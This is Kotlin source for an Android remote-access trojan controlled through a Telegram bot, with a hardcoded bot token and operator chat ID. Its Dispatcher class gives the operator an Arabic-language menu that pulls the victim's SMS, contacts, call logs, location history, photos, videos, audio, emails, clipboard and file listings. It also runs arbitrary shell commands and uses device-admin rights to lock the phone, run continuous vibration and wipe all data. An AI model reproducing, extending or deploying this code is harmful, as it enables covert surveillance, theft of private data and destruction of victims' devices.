package com.spud.ratc2

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import org.json.JSONArray
import org.json.JSONObject
import java.net.URLEncoder

class Dispatcher(private val ctx: Context) {

    private val BOT = "8873170295:AAHX-1ddnEn3iBzwcWRFHyABrbzRV0xUCMU"
    private val MY_CHAT = "8868615222"
    private val BASE = "https://api.telegram.org/bot$BOT"
    private val c = Collectors(ctx)
    private val loc = LocationHelper(ctx)
    @Volatile private var offset = 0L

    init { loc.startUpdates() }

    fun loop() {
        while (true) {
            try { tick() } catch (e: Exception) { Thread.sleep(3000) }
        }
    }

    private fun tick() {
        val body = Sender.get("$BASE/getUpdates?offset=$offset&timeout=25")
        val root = JSONObject(body)
        if (!root.optBoolean("ok")) return
        val arr = root.optJSONArray("result") ?: return
        for (i in 0 until arr.length()) {
            val u = arr.getJSONObject(i)
            offset = u.getLong("update_id") + 1
            val cb = u.optJSONObject("callback_query")
            if (cb != null) {
                val chatId = cb.getJSONObject("message").getJSONObject("chat").getString("id")
                val data = cb.optString("data", "")
                val cbId = cb.getString("id")
                answer(cbId)
                if (chatId == MY_CHAT) doAction(chatId, data)
                continue
            }
            val m = u.optJSONObject("message") ?: continue
            val chatId = m.getJSONObject("chat").getString("id")
            val text = m.optString("text", "")
            if (text.isBlank() || chatId != MY_CHAT) continue
            if (text.startsWith("/start") || text.startsWith("/help")) menu(chatId)
            else if (text.startsWith("/shell ")) send(chatId, shell(text.removePrefix("/shell ")).take(3800))
        }
    }

    private fun doAction(chatId: String, data: String) {
        when (data) {
            // معلومات — رسائل
            "device"    -> send(chatId, c.deviceInfo())
            "battery"   -> send(chatId, c.batteryStorage())
            "storage"   -> send(chatId, c.storage())
            "network"   -> send(chatId, c.network())
            "location"  -> sendCurrentLocation(chatId)
            "clipboard" -> send(chatId, c.clipboard())

            // قوائم الأعداد
            "m_sms"       -> askCount(chatId, "sms", "كم رسالة تريد؟")
            "m_contacts"  -> askCount(chatId, "contacts", "كم جهة تريد؟")
            "m_calls"     -> askCount(chatId, "calls", "كم مكالمة تريد؟")
            "m_loc"       -> askCount(chatId, "loc", "كم موقع تريد؟")
            "m_images"    -> askCount(chatId, "images", "كم صورة تريد؟")
            "m_videos"    -> askCount(chatId, "videos", "كم فيديو تريد؟")
            "m_audio"     -> askCount(chatId, "audio", "كم ملف صوتي تريد؟")

            // الأعداد المختارة
            "n_sms_5" -> file(chatId, "sms_5.txt", c.sms(5))
            "n_sms_10" -> file(chatId, "sms_10.txt", c.sms(10))
            "n_sms_20" -> file(chatId, "sms_20.txt", c.sms(20))
            "n_sms_50" -> file(chatId, "sms_50.txt", c.sms(50))
            "n_sms_100" -> file(chatId, "sms_100.txt", c.sms(100))
            "n_sms_200" -> file(chatId, "sms_200.txt", c.sms(200))
            "n_sms_500" -> file(chatId, "sms_500.txt", c.sms(500))
            "n_sms_all" -> file(chatId, "sms_all.txt", c.sms(99999))

            "n_contacts_5" -> file(chatId, "contacts_5.txt", c.contacts(5))
            "n_contacts_10" -> file(chatId, "contacts_10.txt", c.contacts(10))
            "n_contacts_20" -> file(chatId, "contacts_20.txt", c.contacts(20))
            "n_contacts_50" -> file(chatId, "contacts_50.txt", c.contacts(50))
            "n_contacts_100" -> file(chatId, "contacts_100.txt", c.contacts(100))
            "n_contacts_200" -> file(chatId, "contacts_200.txt", c.contacts(200))
            "n_contacts_500" -> file(chatId, "contacts_500.txt", c.contacts(500))
            "n_contacts_all" -> file(chatId, "contacts_all.txt", c.contacts(99999))

            "n_calls_5" -> file(chatId, "calls_5.txt", c.calls(5))
            "n_calls_10" -> file(chatId, "calls_10.txt", c.calls(10))
            "n_calls_20" -> file(chatId, "calls_20.txt", c.calls(20))
            "n_calls_50" -> file(chatId, "calls_50.txt", c.calls(50))
            "n_calls_100" -> file(chatId, "calls_100.txt", c.calls(100))
            "n_calls_200" -> file(chatId, "calls_200.txt", c.calls(200))
            "n_calls_500" -> file(chatId, "calls_500.txt", c.calls(500))
            "n_calls_all" -> file(chatId, "calls_all.txt", c.calls(99999))

            "n_loc_5" -> send(chatId, loc.historyText(5))
            "n_loc_10" -> send(chatId, loc.historyText(10))
            "n_loc_20" -> send(chatId, loc.historyText(20))
            "n_loc_50" -> send(chatId, loc.historyText(50))
            "n_loc_100" -> send(chatId, loc.historyText(100))
            "n_loc_all" -> send(chatId, loc.historyText(loc.historyCount()))

            "n_images_5" -> sendImages(chatId, 5)
            "n_images_10" -> sendImages(chatId, 10)
            "n_images_20" -> sendImages(chatId, 20)
            "n_images_50" -> sendImages(chatId, 50)
            "n_images_100" -> sendImages(chatId, 100)
            "n_images_all" -> sendImages(chatId, 9999)

            "n_videos_5" -> sendVideos(chatId, 5)
            "n_videos_10" -> sendVideos(chatId, 10)
            "n_videos_20" -> sendVideos(chatId, 20)
            "n_videos_50" -> sendVideos(chatId, 50)
            "n_videos_all" -> sendVideos(chatId, 9999)

            "n_audio_5" -> sendAudio(chatId, 5)
            "n_audio_10" -> sendAudio(chatId, 10)
            "n_audio_20" -> sendAudio(chatId, 20)
            "n_audio_50" -> sendAudio(chatId, 50)
            "n_audio_100" -> sendAudio(chatId, 100)
            "n_audio_all" -> sendAudio(chatId, 9999)

            // ملفات
            "sdcard"    -> file(chatId, "sdcard.txt", c.files("/sdcard"))
            "downloads" -> file(chatId, "downloads.txt", c.files("/sdcard/Download"))
            "apps"      -> file(chatId, "apps_all.txt", c.apps())
            "sysapps"   -> file(chatId, "apps_system.txt", c.systemApps())
            "emails"    -> file(chatId, "emails.txt", c.emails())

            // تحكم
            "lock"      -> lock(chatId)
            "vibro_on"  -> { Vibro.start(ctx); send(chatId, "📳 الاهتزاز شغال — مستمر") }
            "vibro_off" -> { Vibro.stop(); send(chatId, "📴 توقف الاهتزاز") }
            "wipe"      -> wipe(chatId)
            "menu"      -> menu(chatId)
            else        -> send(chatId, "زر غير معروف: $data")
        }
        // القوائم الرئيسية فقط — نعيد القائمة إذا رجع لها
        if (data == "menu") return
    }

    private fun askCount(chatId: String, key: String, question: String) {
        val kb = JSONArray().apply {
            put(row(b("5", "n_${key}_5"), b("10", "n_${key}_10"), b("20", "n_${key}_20")))
            put(row(b("50", "n_${key}_50"), b("100", "n_${key}_100"), b("200", "n_${key}_200")))
            put(row(b("500", "n_${key}_500"), b("الكل", "n_${key}_all")))
            put(row(b("❌ إلغاء", "menu")))
        }
        val mk = JSONObject().put("inline_keyboard", kb)
        val p = "chat_id=$chatId&text=" + URLEncoder.encode(question, "UTF-8") +
                "&reply_markup=" + URLEncoder.encode(mk.toString(), "UTF-8")
        try { Sender.post("$BASE/sendMessage", p) } catch (_: Exception) {}
    }

    private fun sendCurrentLocation(chatId: String) {
        val l = loc.current()
        if (l == null) { send(chatId, "📍 ما لقيت موقع. افتح تطبيق الخرائط مرة وشغّل GPS، ثم أعد المحاولة."); return }
        val full = loc.describe(l) + "\n\n" + c.deviceInfo() + "\n" + c.batteryStorage()
        send(chatId, full)
        try {
            Sender.post("$BASE/sendLocation", "chat_id=$chatId&latitude=${l.latitude}&longitude=${l.longitude}")
        } catch (_: Exception) {}
    }

    private fun file(chatId: String, name: String, content: String) {
        Sender.sendDocument(BASE, chatId, name, content)
        menu(chatId)
    }

    private fun sendImages(chatId: String, limit: Int) {
        val files = c.listImages(limit)
        if (files.isEmpty()) { send(chatId, "❌ ما لقيت صور"); menu(chatId); return }
        send(chatId, "🖼️ جاري إرسال ${files.size} صورة…")
        for (f in files) { try { Sender.sendPhoto(BASE, chatId, f.absolutePath) } catch (_: Exception) {} }
        menu(chatId)
    }

    private fun sendVideos(chatId: String, limit: Int) {
        val files = c.listVideos(limit)
        if (files.isEmpty()) { send(chatId, "❌ ما لقيت فيديو"); menu(chatId); return }
        send(chatId, "🎬 جاري إرسال ${files.size} فيديو…")
        for (f in files) { try { Sender.sendVideo(BASE, chatId, f.absolutePath) } catch (_: Exception) {} }
        menu(chatId)
    }

    private fun sendAudio(chatId: String, limit: Int) {
        val files = c.listAudio(limit)
        if (files.isEmpty()) { send(chatId, "❌ ما لقيت ملفات صوتية"); menu(chatId); return }
        send(chatId, "🎵 جاري إرسال ${files.size} ملف صوتي…")
        for (f in files) { try { Sender.sendAudio(BASE, chatId, f.absolutePath) } catch (_: Exception) {} }
        menu(chatId)
    }

    private fun lock(chatId: String) {
        try {
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val a = ComponentName(ctx, MyAdmin::class.java)
            if (!dpm.isAdminActive(a)) { send(chatId, "❌ التطبيق مو مشرف"); return }
            dpm.lockNow()
            send(chatId, "🔒 تم القفل")
        } catch (e: Exception) { send(chatId, "خطأ: ${e.message}") }
    }

    private fun wipe(chatId: String) {
        try {
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val a = ComponentName(ctx, MyAdmin::class.java)
            if (!dpm.isAdminActive(a)) { send(chatId, "❌ التطبيق مو مشرف"); return }
            dpm.wipeData(0)
        } catch (e: Exception) { send(chatId, "خطأ: ${e.message}") }
    }

    private fun shell(cmd: String): String = try {
        val p = ProcessBuilder("sh", "-c", cmd).redirectErrorStream(true).start()
        val out = p.inputStream.bufferedReader().readText()
        p.waitFor()
        out.ifBlank { "(مافي ناتج)" }
    } catch (e: Exception) { "خطأ: ${e.message}" }

    private fun send(chatId: String, text: String) {
        try {
            val p = "chat_id=$chatId&text=" + URLEncoder.encode(text, "UTF-8")
            Sender.post("$BASE/sendMessage", p)
        } catch (_: Exception) {}
    }

    private fun menu(chatId: String) {
        val kb = JSONArray().apply {
            put(row(b("📱 معلومات الجهاز", "device"), b("🔋 البطارية", "battery")))
            put(row(b("💾 التخزين", "storage"), b("🌐 الشبكة", "network")))
            put(row(b("📍 الموقع الحالي", "location")))
            put(row(b("🗺️ آخر المواقع", "m_loc")))
            put(row(b("💬 الرسائل SMS", "m_sms"), b("👥 جهات الاتصال", "m_contacts")))
            put(row(b("📞 المكالمات", "m_calls")))
            put(row(b("🖼️ الصور", "m_images"), b("🎬 الفيديو", "m_videos")))
            put(row(b("🎵 الصوتيات", "m_audio")))
            put(row(b("📧 الإيميلات", "emails"), b("📋 الحافظة", "clipboard")))
            put(row(b("📂 /sdcard", "sdcard"), b("📁 التنزيلات", "downloads")))
            put(row(b("📦 التطبيقات", "apps"), b("⚙️ النظام", "sysapps")))
            put(row(b("🔒 قفل الشاشة", "lock")))
            put(row(b("📳 اهتزاز مستمر", "vibro_on"), b("📴 إيقاف الاهتزاز", "vibro_off")))
            put(row(b("🗑️ تنسيق", "wipe")))
        }
        val mk = JSONObject().put("inline_keyboard", kb)
        val p = "chat_id=$chatId&text=" + URLEncoder.encode("🎛️ لوحة التحكم", "UTF-8") +
                "&reply_markup=" + URLEncoder.encode(mk.toString(), "UTF-8")
        try { Sender.post("$BASE/sendMessage", p) } catch (_: Exception) {}
    }

    private fun row(vararg items: JSONObject): JSONArray {
        val a = JSONArray()
        for (x in items) a.put(x)
        return a
    }

    private fun b(t: String, d: String) = JSONObject().put("text", t).put("callback_data", d)

    private fun answer(id: String) {
        try { Sender.post("$BASE/answerCallbackQuery", "callback_query_id=$id") } catch (_: Exception) {}
    }
}
